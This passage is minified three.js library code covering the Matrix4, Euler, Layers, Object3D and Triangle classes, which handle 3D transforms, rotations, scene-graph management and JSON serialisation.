this.set(e.x,t.x,n.x,0,e.y,t.y,n.y,0,e.z,t.z,n.z,0,0,0,0,1),this}extractRotation(e){const t=this.elements,n=e.elements,r=1/Dn.setFromMatrixColumn(e,0).length(),s=1/Dn.setFromMatrixColumn(e,1).length(),o=1/Dn.setFromMatrixColumn(e,2).length();return t[0]=n[0]*r,t[1]=n[1]*r,t[2]=n[2]*r,t[3]=0,t[4]=n[4]*s,t[5]=n[5]*s,t[6]=n[6]*s,t[7]=0,t[8]=n[8]*o,t[9]=n[9]*o,t[10]=n[10]*o,t[11]=0,t[12]=0,t[13]=0,t[14]=0,t[15]=1,this}makeRotationFromEuler(e){const t=this.elements,n=e.x,r=e.y,s=e.z,o=Math.cos(n),a=Math.sin(n),l=Math.cos(r),d=Math.sin(r),u=Math.cos(s),h=Math.sin(s);if(e.order==="XYZ"){const p=o*u,m=o*h,E=a*u,x=a*h;t[0]=l*u,t[4]=-l*h,t[8]=d,t[1]=m+E*d,t[5]=p-x*d,t[9]=-a*l,t[2]=x-p*d,t[6]=E+m*d,t[10]=o*l}else if(e.order==="YXZ"){const p=l*u,m=l*h,E=d*u,x=d*h;t[0]=p+x*a,t[4]=E*a-m,t[8]=o*d,t[1]=o*h,t[5]=o*u,t[9]=-a,t[2]=m*a-E,t[6]=x+p*a,t[10]=o*l}else if(e.order==="ZXY"){const p=l*u,m=l*h,E=d*u,x=d*h;t[0]=p-x*a,t[4]=-o*h,t[8]=E+m*a,t[1]=m+E*a,t[5]=o*u,t[9]=x-p*a,t[2]=-o*d,t[6]=a,t[10]=o*l}else if(e.order==="ZYX"){const p=o*u,m=o*h,E=a*u,x=a*h;t[0]=l*u,t[4]=E*d-m,t[8]=p*d+x,t[1]=l*h,t[5]=x*d+p,t[9]=m*d-E,t[2]=-d,t[6]=a*l,t[10]=o*l}else if(e.order==="YZX"){const p=o*l,m=o*d,E=a*l,x=a*d;t[0]=l*u,t[4]=x-p*h,t[8]=E*h+m,t[1]=h,t[5]=o*u,t[9]=-a*u,t[2]=-d*u,t[6]=m*h+E,t[10]=p-x*h}else if(e.order==="XZY"){const p=o*l,m=o*d,E=a*l,x=a*d;t[0]=l*u,t[4]=-h,t[8]=d*u,t[1]=p*h+x,t[5]=o*u,t[9]=m*h-E,t[2]=E*h-m,t[6]=a*u,t[10]=x*h+p}return t[3]=0,t[7]=0,t[11]=0,t[12]=0,t[13]=0,t[14]=0,t[15]=1,this}makeRotationFromQuaternion(e){return this.compose(Kl,e,$l)}lookAt(e,t,n){const r=this.elements;return Mt.subVectors(e,t),Mt.lengthSq()===0&&(Mt.z=1),Mt.normalize(),tn.crossVectors(n,Mt),tn.lengthSq()===0&&(Math.abs(n.z)===1?Mt.x+=1e-4:Mt.z+=1e-4,Mt.normalize(),tn.crossVectors(n,Mt)),tn.normalize(),Ri.crossVectors(Mt,tn),r[0]=tn.x,r[4]=Ri.x,r[8]=Mt.x,r[1]=tn.y,r[5]=Ri.y,r[9]=Mt.y,r[2]=tn.z,r[6]=Ri.z,r[10]=Mt.z,this}multiply(e){return this.multiplyMatrices(this,e)}premultiply(e){return this.multiplyMatrices(e,this)}multiplyMatrices(e,t){const n=e.elements,r=t.elements,s=this.elements,o=n[0],a=n[4],l=n[8],d=n[12],u=n[1],h=n[5],p=n[9],m=n[13],E=n[2],x=n[6],f=n[10],c=n[14],g=n[3],_=n[7],v=n[11],w=n[15],M=r[0],T=r[4],D=r[8],y=r[12],R=r[1],k=r[5],X=r[9],te=r[13],P=r[2],z=r[6],W=r[10],Y=r[14],H=r[3],V=r[7],q=r[11],Q=r[15];return s[0]=o*M+a*R+l*P+d*H,s[4]=o*T+a*k+l*z+d*V,s[8]=o*D+a*X+l*W+d*q,s[12]=o*y+a*te+l*Y+d*Q,s[1]=u*M+h*R+p*P+m*H,s[5]=u*T+h*k+p*z+m*V,s[9]=u*D+h*X+p*W+m*q,s[13]=u*y+h*te+p*Y+m*Q,s[2]=E*M+x*R+f*P+c*H,s[6]=E*T+x*k+f*z+c*V,s[10]=E*D+x*X+f*W+c*q,s[14]=E*y+x*te+f*Y+c*Q,s[3]=g*M+_*R+v*P+w*H,s[7]=g*T+_*k+v*z+w*V,s[11]=g*D+_*X+v*W+w*q,s[15]=g*y+_*te+v*Y+w*Q,this}multiplyScalar(e){const t=this.elements;return t[0]*=e,t[4]*=e,t[8]*=e,t[12]*=e,t[1]*=e,t[5]*=e,t[9]*=e,t[13]*=e,t[2]*=e,t[6]*=e,t[10]*=e,t[14]*=e,t[3]*=e,t[7]*=e,t[11]*=e,t[15]*=e,this}determinant(){const e=this.elements,t=e[0],n=e[4],r=e[8],s=e[12],o=e[1],a=e[5],l=e[9],d=e[13],u=e[2],h=e[6],p=e[10],m=e[14],E=e[3],x=e[7],f=e[11],c=e[15];return E*(+s*l*h-r*d*h-s*a*p+n*d*p+r*a*m-n*l*m)+x*(+t*l*m-t*d*p+s*o*p-r*o*m+r*d*u-s*l*u)+f*(+t*d*h-t*a*m-s*o*h+n*o*m+s*a*u-n*d*u)+c*(-r*a*u-t*l*h+t*a*p+r*o*h-n*o*p+n*l*u)}transpose(){const e=this.elements;let t;return t=e[1],e[1]=e[4],e[4]=t,t=e[2],e[2]=e[8],e[8]=t,t=e[6],e[6]=e[9],e[9]=t,t=e[3],e[3]=e[12],e[12]=t,t=e[7],e[7]=e[13],e[13]=t,t=e[11],e[11]=e[14],e[14]=t,this}setPosition(e,t,n){const r=this.elements;return e.isVector3?(r[12]=e.x,r[13]=e.y,r[14]=e.z):(r[12]=e,r[13]=t,r[14]=n),this}invert(){const e=this.elements,t=e[0],n=e[1],r=e[2],s=e[3],o=e[4],a=e[5],l=e[6],d=e[7],u=e[8],h=e[9],p=e[10],m=e[11],E=e[12],x=e[13],f=e[14],c=e[15],g=h*f*d-x*p*d+x*l*m-a*f*m-h*l*c+a*p*c,_=E*p*d-u*f*d-E*l*m+o*f*m+u*l*c-o*p*c,v=u*x*d-E*h*d+E*a*m-o*x*m-u*a*c+o*h*c,w=E*h*l-u*x*l-E*a*p+o*x*p+u*a*f-o*h*f,M=t*g+n*_+r*v+s*w;if(M===0)return this.set(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0);const T=1/M;return e[0]=g*T,e[1]=(x*p*s-h*f*s-x*r*m+n*f*m+h*r*c-n*p*c)*T,e[2]=(a*f*s-x*l*s+x*r*d-n*f*d-a*r*c+n*l*c)*T,e[3]=(h*l*s-a*p*s-h*r*d+n*p*d+a*r*m-n*l*m)*T,e[4]=_*T,e[5]=(u*f*s-E*p*s+E*r*m-t*f*m-u*r*c+t*p*c)*T,e[6]=(E*l*s-o*f*s-E*r*d+t*f*d+o*r*c-t*l*c)*T,e[7]=(o*p*s-u*l*s+u*r*d-t*p*d-o*r*m+t*l*m)*T,e[8]=v*T,e[9]=(E*h*s-u*x*s-E*n*m+t*x*m+u*n*c-t*h*c)*T,e[10]=(o*x*s-E*a*s+E*n*d-t*x*d-o*n*c+t*a*c)*T,e[11]=(u*a*s-o*h*s-u*n*d+t*h*d+o*n*m-t*a*m)*T,e[12]=w*T,e[13]=(u*x*r-E*h*r+E*n*p-t*x*p-u*n*f+t*h*f)*T,e[14]=(E*a*r-o*x*r-E*n*l+t*x*l+o*n*f-t*a*f)*T,e[15]=(o*h*r-u*a*r+u*n*l-t*h*l-o*n*p+t*a*p)*T,this}scale(e){const t=this.elements,n=e.x,r=e.y,s=e.z;return t[0]*=n,t[4]*=r,t[8]*=s,t[1]*=n,t[5]*=r,t[9]*=s,t[2]*=n,t[6]*=r,t[10]*=s,t[3]*=n,t[7]*=r,t[11]*=s,this}getMaxScaleOnAxis(){const e=this.elements,t=e[0]*e[0]+e[1]*e[1]+e[2]*e[2],n=e[4]*e[4]+e[5]*e[5]+e[6]*e[6],r=e[8]*e[8]+e[9]*e[9]+e[10]*e[10];return Math.sqrt(Math.max(t,n,r))}makeTranslation(e,t,n){return e.isVector3?this.set(1,0,0,e.x,0,1,0,e.y,0,0,1,e.z,0,0,0,1):this.set(1,0,0,e,0,1,0,t,0,0,1,n,0,0,0,1),this}makeRotationX(e){const t=Math.cos(e),n=Math.sin(e);return this.set(1,0,0,0,0,t,-n,0,0,n,t,0,0,0,0,1),this}makeRotationY(e){const t=Math.cos(e),n=Math.sin(e);return this.set(t,0,n,0,0,1,0,0,-n,0,t,0,0,0,0,1),this}makeRotationZ(e){const t=Math.cos(e),n=Math.sin(e);return this.set(t,-n,0,0,n,t,0,0,0,0,1,0,0,0,0,1),this}makeRotationAxis(e,t){const n=Math.cos(t),r=Math.sin(t),s=1-n,o=e.x,a=e.y,l=e.z,d=s*o,u=s*a;return this.set(d*o+n,d*a-r*l,d*l+r*a,0,d*a+r*l,u*a+n,u*l-r*o,0,d*l-r*a,u*l+r*o,s*l*l+n,0,0,0,0,1),this}makeScale(e,t,n){return this.set(e,0,0,0,0,t,0,0,0,0,n,0,0,0,0,1),this}makeShear(e,t,n,r,s,o){return this.set(1,n,s,0,e,1,o,0,t,r,1,0,0,0,0,1),this}compose(e,t,n){const r=this.elements,s=t._x,o=t._y,a=t._z,l=t._w,d=s+s,u=o+o,h=a+a,p=s*d,m=s*u,E=s*h,x=o*u,f=o*h,c=a*h,g=l*d,_=l*u,v=l*h,w=n.x,M=n.y,T=n.z;return r[0]=(1-(x+c))*w,r[1]=(m+v)*w,r[2]=(E-_)*w,r[3]=0,r[4]=(m-v)*M,r[5]=(1-(p+c))*M,r[6]=(f+g)*M,r[7]=0,r[8]=(E+_)*T,r[9]=(f-g)*T,r[10]=(1-(p+x))*T,r[11]=0,r[12]=e.x,r[13]=e.y,r[14]=e.z,r[15]=1,this}decompose(e,t,n){const r=this.elements;let s=Dn.set(r[0],r[1],r[2]).length();const o=Dn.set(r[4],r[5],r[6]).length(),a=Dn.set(r[8],r[9],r[10]).length();this.determinant()<0&&(s=-s),e.x=r[12],e.y=r[13],e.z=r[14],Dt.copy(this);const d=1/s,u=1/o,h=1/a;return Dt.elements[0]*=d,Dt.elements[1]*=d,Dt.elements[2]*=d,Dt.elements[4]*=u,Dt.elements[5]*=u,Dt.elements[6]*=u,Dt.elements[8]*=h,Dt.elements[9]*=h,Dt.elements[10]*=h,t.setFromRotationMatrix(Dt),n.x=s,n.y=o,n.z=a,this}makePerspective(e,t,n,r,s,o,a=$t){const l=this.elements,d=2*s/(t-e),u=2*s/(n-r),h=(t+e)/(t-e),p=(n+r)/(n-r);let m,E;if(a===$t)m=-(o+s)/(o-s),E=-2*o*s/(o-s);else if(a===Zi)m=-o/(o-s),E=-o*s/(o-s);else throw new Error("THREE.Matrix4.makePerspective(): Invalid coordinate system: "+a);return l[0]=d,l[4]=0,l[8]=h,l[12]=0,l[1]=0,l[5]=u,l[9]=p,l[13]=0,l[2]=0,l[6]=0,l[10]=m,l[14]=E,l[3]=0,l[7]=0,l[11]=-1,l[15]=0,this}makeOrthographic(e,t,n,r,s,o,a=$t){const l=this.elements,d=1/(t-e),u=1/(n-r),h=1/(o-s),p=(t+e)*d,m=(n+r)*u;let E,x;if(a===$t)E=(o+s)*h,x=-2*h;else if(a===Zi)E=s*h,x=-1*h;else throw new Error("THREE.Matrix4.makeOrthographic(): Invalid coordinate system: "+a);return l[0]=2*d,l[4]=0,l[8]=0,l[12]=-p,l[1]=0,l[5]=2*u,l[9]=0,l[13]=-m,l[2]=0,l[6]=0,l[10]=x,l[14]=-E,l[3]=0,l[7]=0,l[11]=0,l[15]=1,this}equals(e){const t=this.elements,n=e.elements;for(let r=0;r<16;r++)if(t[r]!==n[r])return!1;return!0}fromArray(e,t=0){for(let n=0;n<16;n++)this.elements[n]=e[n+t];return this}toArray(e=[],t=0){const n=this.elements;return e[t]=n[0],e[t+1]=n[1],e[t+2]=n[2],e[t+3]=n[3],e[t+4]=n[4],e[t+5]=n[5],e[t+6]=n[6],e[t+7]=n[7],e[t+8]=n[8],e[t+9]=n[9],e[t+10]=n[10],e[t+11]=n[11],e[t+12]=n[12],e[t+13]=n[13],e[t+14]=n[14],e[t+15]=n[15],e}}const Dn=new L,Dt=new Ze,Kl=new L(0,0,0),$l=new L(1,1,1),tn=new L,Ri=new L,Mt=new L,aa=new Ze,oa=new _i;class ir{constructor(e=0,t=0,n=0,r=ir.DEFAULT_ORDER){this.isEuler=!0,this._x=e,this._y=t,this._z=n,this._order=r}get x(){return this._x}set x(e){this._x=e,this._onChangeCallback()}get y(){return this._y}set y(e){this._y=e,this._onChangeCallback()}get z(){return this._z}set z(e){this._z=e,this._onChangeCallback()}get order(){return this._order}set order(e){this._order=e,this._onChangeCallback()}set(e,t,n,r=this._order){return this._x=e,this._y=t,this._z=n,this._order=r,this._onChangeCallback(),this}clone(){return new this.constructor(this._x,this._y,this._z,this._order)}copy(e){return this._x=e._x,this._y=e._y,this._z=e._z,this._order=e._order,this._onChangeCallback(),this}setFromRotationMatrix(e,t=this._order,n=!0){const r=e.elements,s=r[0],o=r[4],a=r[8],l=r[1],d=r[5],u=r[9],h=r[2],p=r[6],m=r[10];switch(t){case"XYZ":this._y=Math.asin(xt(a,-1,1)),Math.abs(a)<.9999999?(this._x=Math.atan2(-u,m),this._z=Math.atan2(-o,s)):(this._x=Math.atan2(p,d),this._z=0);break;case"YXZ":this._x=Math.asin(-xt(u,-1,1)),Math.abs(u)<.9999999?(this._y=Math.atan2(a,m),this._z=Math.atan2(l,d)):(this._y=Math.atan2(-h,s),this._z=0);break;case"ZXY":this._x=Math.asin(xt(p,-1,1)),Math.abs(p)<.9999999?(this._y=Math.atan2(-h,m),this._z=Math.atan2(-o,d)):(this._y=0,this._z=Math.atan2(l,s));break;case"ZYX":this._y=Math.asin(-xt(h,-1,1)),Math.abs(h)<.9999999?(this._x=Math.atan2(p,m),this._z=Math.atan2(l,s)):(this._x=0,this._z=Math.atan2(-o,d));break;case"YZX":this._z=Math.asin(xt(l,-1,1)),Math.abs(l)<.9999999?(this._x=Math.atan2(-u,d),this._y=Math.atan2(-h,s)):(this._x=0,this._y=Math.atan2(a,m));break;case"XZY":this._z=Math.asin(-xt(o,-1,1)),Math.abs(o)<.9999999?(this._x=Math.atan2(p,d),this._y=Math.atan2(a,s)):(this._x=Math.atan2(-u,m),this._y=0);break;default:console.warn("THREE.Euler: .setFromRotationMatrix() encountered an unknown order: "+t)}return this._order=t,n===!0&&this._onChangeCallback(),this}setFromQuaternion(e,t,n){return aa.makeRotationFromQuaternion(e),this.setFromRotationMatrix(aa,t,n)}setFromVector3(e,t=this._order){return this.set(e.x,e.y,e.z,t)}reorder(e){return oa.setFromEuler(this),this.setFromQuaternion(oa,e)}equals(e){return e._x===this._x&&e._y===this._y&&e._z===this._z&&e._order===this._order}fromArray(e){return this._x=e[0],this._y=e[1],this._z=e[2],e[3]!==void 0&&(this._order=e[3]),this._onChangeCallback(),this}toArray(e=[],t=0){return e[t]=this._x,e[t+1]=this._y,e[t+2]=this._z,e[t+3]=this._order,e}_onChange(e){return this._onChangeCallback=e,this}_onChangeCallback(){}*[Symbol.iterator](){yield this._x,yield this._y,yield this._z,yield this._order}}ir.DEFAULT_ORDER="XYZ";class cs{constructor(){this.mask=1}set(e){this.mask=(1<<e|0)>>>0}enable(e){this.mask|=1<<e|0}enableAll(){this.mask=-1}toggle(e){this.mask^=1<<e|0}disable(e){this.mask&=~(1<<e|0)}disableAll(){this.mask=0}test(e){return(this.mask&e.mask)!==0}isEnabled(e){return(this.mask&(1<<e|0))!==0}}let Zl=0;const la=new L,Nn=new _i,qt=new Ze,wi=new L,ai=new L,Ql=new L,Jl=new _i,ca=new L(1,0,0),da=new L(0,1,0),ua=new L(0,0,1),ec={type:"added"},tc={type:"removed"};class yt extends Jn{constructor(){super(),this.isObject3D=!0,Object.defineProperty(this,"id",{value:Zl++}),this.uuid=mi(),this.name="",this.type="Object3D",this.parent=null,this.children=[],this.up=yt.DEFAULT_UP.clone();const e=new L,t=new ir,n=new _i,r=new L(1,1,1);function s(){n.setFromEuler(t,!1)}function o(){t.setFromQuaternion(n,void 0,!1)}t._onChange(s),n._onChange(o),Object.defineProperties(this,{position:{configurable:!0,enumerable:!0,value:e},rotation:{configurable:!0,enumerable:!0,value:t},quaternion:{configurable:!0,enumerable:!0,value:n},scale:{configurable:!0,enumerable:!0,value:r},modelViewMatrix:{value:new Ze},normalMatrix:{value:new ke}}),this.matrix=new Ze,this.matrixWorld=new Ze,this.matrixAutoUpdate=yt.DEFAULT_MATRIX_AUTO_UPDATE,this.matrixWorldAutoUpdate=yt.DEFAULT_MATRIX_WORLD_AUTO_UPDATE,this.matrixWorldNeedsUpdate=!1,this.layers=new cs,this.visible=!0,this.castShadow=!1,this.receiveShadow=!1,this.frustumCulled=!0,this.renderOrder=0,this.animations=[],this.userData={}}onBeforeShadow(){}onAfterShadow(){}onBeforeRender(){}onAfterRender(){}applyMatrix4(e){this.matrixAutoUpdate&&this.updateMatrix(),this.matrix.premultiply(e),this.matrix.decompose(this.position,this.quaternion,this.scale)}applyQuaternion(e){return this.quaternion.premultiply(e),this}setRotationFromAxisAngle(e,t){this.quaternion.setFromAxisAngle(e,t)}setRotationFromEuler(e){this.quaternion.setFromEuler(e,!0)}setRotationFromMatrix(e){this.quaternion.setFromRotationMatrix(e)}setRotationFromQuaternion(e){this.quaternion.copy(e)}rotateOnAxis(e,t){return Nn.setFromAxisAngle(e,t),this.quaternion.multiply(Nn),this}rotateOnWorldAxis(e,t){return Nn.setFromAxisAngle(e,t),this.quaternion.premultiply(Nn),this}rotateX(e){return this.rotateOnAxis(ca,e)}rotateY(e){return this.rotateOnAxis(da,e)}rotateZ(e){return this.rotateOnAxis(ua,e)}translateOnAxis(e,t){return la.copy(e).applyQuaternion(this.quaternion),this.position.add(la.multiplyScalar(t)),this}translateX(e){return this.translateOnAxis(ca,e)}translateY(e){return this.translateOnAxis(da,e)}translateZ(e){return this.translateOnAxis(ua,e)}localToWorld(e){return this.updateWorldMatrix(!0,!1),e.applyMatrix4(this.matrixWorld)}worldToLocal(e){return this.updateWorldMatrix(!0,!1),e.applyMatrix4(qt.copy(this.matrixWorld).invert())}lookAt(e,t,n){e.isVector3?wi.copy(e):wi.set(e,t,n);const r=this.parent;this.updateWorldMatrix(!0,!1),ai.setFromMatrixPosition(this.matrixWorld),this.isCamera||this.isLight?qt.lookAt(ai,wi,this.up):qt.lookAt(wi,ai,this.up),this.quaternion.setFromRotationMatrix(qt),r&&(qt.extractRotation(r.matrixWorld),Nn.setFromRotationMatrix(qt),this.quaternion.premultiply(Nn.invert()))}add(e){if(arguments.length>1){for(let t=0;t<arguments.length;t++)this.add(arguments[t]);return this}return e===this?(console.error("THREE.Object3D.add: object can't be added as a child of itself.",e),this):(e&&e.isObject3D?(e.parent!==null&&e.parent.remove(e),e.parent=this,this.children.push(e),e.dispatchEvent(ec)):console.error("THREE.Object3D.add: object not an instance of THREE.Object3D.",e),this)}remove(e){if(arguments.length>1){for(let n=0;n<arguments.length;n++)this.remove(arguments[n]);return this}const t=this.children.indexOf(e);return t!==-1&&(e.parent=null,this.children.splice(t,1),e.dispatchEvent(tc)),this}removeFromParent(){const e=this.parent;return e!==null&&e.remove(this),this}clear(){return this.remove(...this.children)}attach(e){return this.updateWorldMatrix(!0,!1),qt.copy(this.matrixWorld).invert(),e.parent!==null&&(e.parent.updateWorldMatrix(!0,!1),qt.multiply(e.parent.matrixWorld)),e.applyMatrix4(qt),this.add(e),e.updateWorldMatrix(!1,!0),this}getObjectById(e){return this.getObjectByProperty("id",e)}getObjectByName(e){return this.getObjectByProperty("name",e)}getObjectByProperty(e,t){if(this[e]===t)return this;for(let n=0,r=this.children.length;n<r;n++){const o=this.children[n].getObjectByProperty(e,t);if(o!==void 0)return o}}getObjectsByProperty(e,t,n=[]){this[e]===t&&n.push(this);const r=this.children;for(let s=0,o=r.length;s<o;s++)r[s].getObjectsByProperty(e,t,n);return n}getWorldPosition(e){return this.updateWorldMatrix(!0,!1),e.setFromMatrixPosition(this.matrixWorld)}getWorldQuaternion(e){return this.updateWorldMatrix(!0,!1),this.matrixWorld.decompose(ai,e,Ql),e}getWorldScale(e){return this.updateWorldMatrix(!0,!1),this.matrixWorld.decompose(ai,Jl,e),e}getWorldDirection(e){this.updateWorldMatrix(!0,!1);const t=this.matrixWorld.elements;return e.set(t[8],t[9],t[10]).normalize()}raycast(){}traverse(e){e(this);const t=this.children;for(let n=0,r=t.length;n<r;n++)t[n].traverse(e)}traverseVisible(e){if(this.visible===!1)return;e(this);const t=this.children;for(let n=0,r=t.length;n<r;n++)t[n].traverseVisible(e)}traverseAncestors(e){const t=this.parent;t!==null&&(e(t),t.traverseAncestors(e))}updateMatrix(){this.matrix.compose(this.position,this.quaternion,this.scale),this.matrixWorldNeedsUpdate=!0}updateMatrixWorld(e){this.matrixAutoUpdate&&this.updateMatrix(),(this.matrixWorldNeedsUpdate||e)&&(this.parent===null?this.matrixWorld.copy(this.matrix):this.matrixWorld.multiplyMatrices(this.parent.matrixWorld,this.matrix),this.matrixWorldNeedsUpdate=!1,e=!0);const t=this.children;for(let n=0,r=t.length;n<r;n++){const s=t[n];(s.matrixWorldAutoUpdate===!0||e===!0)&&s.updateMatrixWorld(e)}}updateWorldMatrix(e,t){const n=this.parent;if(e===!0&&n!==null&&n.matrixWorldAutoUpdate===!0&&n.updateWorldMatrix(!0,!1),this.matrixAutoUpdate&&this.updateMatrix(),this.parent===null?this.matrixWorld.copy(this.matrix):this.matrixWorld.multiplyMatrices(this.parent.matrixWorld,this.matrix),t===!0){const r=this.children;for(let s=0,o=r.length;s<o;s++){const a=r[s];a.matrixWorldAutoUpdate===!0&&a.updateWorldMatrix(!1,!0)}}}toJSON(e){const t=e===void 0||typeof e=="string",n={};t&&(e={geometries:{},materials:{},textures:{},images:{},shapes:{},skeletons:{},animations:{},nodes:{}},n.metadata={version:4.6,type:"Object",generator:"Object3D.toJSON"});const r={};r.uuid=this.uuid,r.type=this.type,this.name!==""&&(r.name=this.name),this.castShadow===!0&&(r.castShadow=!0),this.receiveShadow===!0&&(r.receiveShadow=!0),this.visible===!1&&(r.visible=!1),this.frustumCulled===!1&&(r.frustumCulled=!1),this.renderOrder!==0&&(r.renderOrder=this.renderOrder),Object.keys(this.userData).length>0&&(r.userData=this.userData),r.layers=this.layers.mask,r.matrix=this.matrix.toArray(),r.up=this.up.toArray(),this.matrixAutoUpdate===!1&&(r.matrixAutoUpdate=!1),this.isInstancedMesh&&(r.type="InstancedMesh",r.count=this.count,r.instanceMatrix=this.instanceMatrix.toJSON(),this.instanceColor!==null&&(r.instanceColor=this.instanceColor.toJSON())),this.isBatchedMesh&&(r.type="BatchedMesh",r.perObjectFrustumCulled=this.perObjectFrustumCulled,r.sortObjects=this.sortObjects,r.drawRanges=this._drawRanges,r.reservedRanges=this._reservedRanges,r.visibility=this._visibility,r.active=this._active,r.bounds=this._bounds.map(a=>({boxInitialized:a.boxInitialized,boxMin:a.box.min.toArray(),boxMax:a.box.max.toArray(),sphereInitialized:a.sphereInitialized,sphereRadius:a.sphere.radius,sphereCenter:a.sphere.center.toArray()})),r.maxGeometryCount=this._maxGeometryCount,r.maxVertexCount=this._maxVertexCount,r.maxIndexCount=this._maxIndexCount,r.geometryInitialized=this._geometryInitialized,r.geometryCount=this._geometryCount,r.matricesTexture=this._matricesTexture.toJSON(e),this.boundingSphere!==null&&(r.boundingSphere={center:r.boundingSphere.center.toArray(),radius:r.boundingSphere.radius}),this.boundingBox!==null&&(r.boundingBox={min:r.boundingBox.min.toArray(),max:r.boundingBox.max.toArray()}));function s(a,l){return a[l.uuid]===void 0&&(a[l.uuid]=l.toJSON(e)),l.uuid}if(this.isScene)this.background&&(this.background.isColor?r.background=this.background.toJSON():this.background.isTexture&&(r.background=this.background.toJSON(e).uuid)),this.environment&&this.environment.isTexture&&this.environment.isRenderTargetTexture!==!0&&(r.environment=this.environment.toJSON(e).uuid);else if(this.isMesh||this.isLine||this.isPoints){r.geometry=s(e.geometries,this.geometry);const a=this.geometry.parameters;if(a!==void 0&&a.shapes!==void 0){const l=a.shapes;if(Array.isArray(l))for(let d=0,u=l.length;d<u;d++){const h=l[d];s(e.shapes,h)}else s(e.shapes,l)}}if(this.isSkinnedMesh&&(r.bindMode=this.bindMode,r.bindMatrix=this.bindMatrix.toArray(),this.skeleton!==void 0&&(s(e.skeletons,this.skeleton),r.skeleton=this.skeleton.uuid)),this.material!==void 0)if(Array.isArray(this.material)){const a=[];for(let l=0,d=this.material.length;l<d;l++)a.push(s(e.materials,this.material[l]));r.material=a}else r.material=s(e.materials,this.material);if(this.children.length>0){r.children=[];for(let a=0;a<this.children.length;a++)r.children.push(this.children[a].toJSON(e).object)}if(this.animations.length>0){r.animations=[];for(let a=0;a<this.animations.length;a++){const l=this.animations[a];r.animations.push(s(e.animations,l))}}if(t){const a=o(e.geometries),l=o(e.materials),d=o(e.textures),u=o(e.images),h=o(e.shapes),p=o(e.skeletons),m=o(e.animations),E=o(e.nodes);a.length>0&&(n.geometries=a),l.length>0&&(n.materials=l),d.length>0&&(n.textures=d),u.length>0&&(n.images=u),h.length>0&&(n.shapes=h),p.length>0&&(n.skeletons=p),m.length>0&&(n.animations=m),E.length>0&&(n.nodes=E)}return n.object=r,n;function o(a){const l=[];for(const d in a){const u=a[d];delete u.metadata,l.push(u)}return l}}clone(e){return new this.constructor().copy(this,e)}copy(e,t=!0){if(this.name=e.name,this.up.copy(e.up),this.position.copy(e.position),this.rotation.order=e.rotation.order,this.quaternion.copy(e.quaternion),this.scale.copy(e.scale),this.matrix.copy(e.matrix),this.matrixWorld.copy(e.matrixWorld),this.matrixAutoUpdate=e.matrixAutoUpdate,this.matrixWorldAutoUpdate=e.matrixWorldAutoUpdate,this.matrixWorldNeedsUpdate=e.matrixWorldNeedsUpdate,this.layers.mask=e.layers.mask,this.visible=e.visible,this.castShadow=e.castShadow,this.receiveShadow=e.receiveShadow,this.frustumCulled=e.frustumCulled,this.renderOrder=e.renderOrder,this.animations=e.animations.slice(),this.userData=JSON.parse(JSON.stringify(e.userData)),t===!0)for(let n=0;n<e.children.length;n++){const r=e.children[n];this.add(r.clone())}return this}}yt.DEFAULT_UP=new L(0,1,0);yt.DEFAULT_MATRIX_AUTO_UPDATE=!0;yt.DEFAULT_MATRIX_WORLD_AUTO_UPDATE=!0;const Nt=new L,Yt=new L,Rr=new L,jt=new L,On=new L,Un=new L,pa=new L,wr=new L,Cr=new L,Pr=new L;let Ci=!1;class Ot{constructor(e=new L,t=new L,n=new L){this.a=e,this.b=t,this.c=n}static getNormal(e,t,n,r){r.subVectors(n,t),Nt.subVectors(e,t),r.cross(Nt);const s=r.lengthSq();return s>0?r.multiplyScalar(1/Math.sqrt(s)):r.set(0,0,0)}static getBarycoord(e,t,n,r,s){Nt.subVectors(r,t),Yt.subVectors(n,t),Rr.subVectors(e,t);const o=Nt.dot(Nt),a=Nt.dot(Yt),l=Nt.dot(Rr),d=Yt.dot(Yt),u=Yt.dot(Rr),h=o*d-a*a;if(h===0)return s.set(0,0,0),null;const p=1/h,m=(d*l-a*u)*p,E=(o*u-a*l)*p;return s.set(1-m-E,E,m)}static containsPoint(e,t,n,r){return this.getBarycoord(e,t,n,r,jt)===null?!1:jt.x>=0&&jt.y>=0&&jt.x+jt.y<=1}static getUV(e,t,n,r,s,o,a,l){return Ci===!1&&(console.warn("THREE.Triangle.getUV() has been renamed to THREE.Triangle.getInterpolation()."),Ci=!0),this.getInterpolation(e,t,n,r,s,o,a,l)}static getInterpolation(e,t,n,r,s,o,a,l){return this.getBarycoord(e,t,n,r,jt)===null?(l.x=0,l.y=0,"z"in l&&(l.z=0),"w"in l&&(l.w=0),null):(l.setScalar(0),l.addScaledVector(s,jt.x),l.addScaledVector(o,jt.y),l.addScaledVector(a,jt.z),l)}static isFrontFacing(e,t,n,r){return Nt.subVectors(n,t),Yt.subVectors(e,t),Nt.cross(Yt).dot(r)<0}set(e,t,n){return this.a.copy(e),this.b.copy(t),this.c.copy(n),this}setFromPointsAndIndices(e,t,n,r){return this.a.copy(e[t]),this.b.copy(e[n]),this.c.copy(e[r]),this}setFromAttributeAndIndices(e,t,n,r){return this.a.fromBufferAttribute(e,t),this.b.fromBufferAttribute(e,n),this.c.fromBufferAttribute(e,r),this}clone(){return new this.constructor().copy(this)}copy(e){return this.a.copy(e.a),this.b.copy(e.b),this.c.copy(e.c),this}getArea(){return Nt.subVectors(this.c,this.b),Yt.subVectors(this.a,this.b),Nt.cross(Yt).length()*.5}getMidpoint(e){return e.addVectors(this.a,this.b).add(this.c).multiplyScalar(1/3)}getNormal(e){return Ot.getNormal(this.a,this.b,this.c,e)}getPlane(e){return e.setFromCoplanarPoints(this.a,this.b,this.c)}getBarycoord(e,t){return Ot.getBarycoord(e,this.a,this.b,this.c,t)}getUV(e,t,n,r,s){return Ci===!1&&(console.warn("THREE.Triangle.getUV() has been renamed to THREE.Triangle.getInterpolation()."),Ci=!0),Ot.getInterpolation(e,this.a,this.b,this.c,t,n,r,s)}getInterpolation(e,t,n,r,s){return Ot.getInterpolation(e,this.a,this.b,this.c,t,n,r,s)}containsPoint(e){return Ot.containsPoint(e,this.a,this.b,this.c)}isFrontFacing(e){return Ot.isFrontFacing(this.a,this.b,this.c,e)}intersectsBox(e){return e.intersectsTriangle(this)}closestPointToPoint(e,t){const n=this.a,r=this.b,s=this.c;let o,a;On.subVectors(r,n),Un.subVectors(s,n),wr.subVectors(e,n);const l=On.dot(wr),d=Un.dot(wr);if(l<=0&&d<=0)return t.copy(n);Cr.subVectors(e,r);const u=On.dot(Cr),h=Un.dot(Cr);if(u>=0&&h<=u)return t.copy(r);const p=l*h-u*d;if(p<=0&&l>=0&&u<=0)return 